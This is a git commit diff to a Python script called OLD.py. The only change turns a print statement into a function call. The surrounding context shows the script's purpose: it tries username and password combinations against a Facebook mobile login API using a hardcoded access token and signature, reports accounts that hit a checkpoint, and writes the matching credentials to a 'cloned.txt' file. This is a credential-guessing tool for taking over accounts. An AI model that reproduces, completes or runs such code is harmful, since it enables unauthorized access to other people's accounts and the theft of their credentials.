e4387fcd353a35deb0ed3571c7074a4bf0d14659
Mr.devil <103495827+Mrdevilbrand@users.noreply.github.com>
2022-05-21 15:10:26 +0500

    Updated

--- OLD.py
+++ OLD.py
@@ -202,7 +202,7 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m(CHECKPOINT)  ' + k + c + user + '  |  ' + pass1 +     '\x1b \x1b[0m \n'                           
+                print ('\x1b[1;91m(CHECKPOINT)  ' + k + c + user + '  |  ' + pass1 +     '\x1b \x1b[0m \n'  )                        
                 okb = open('save/cloned.txt', 'a')
                 okb.write(k+c+user+pass1+'\n')
                 okb.close()
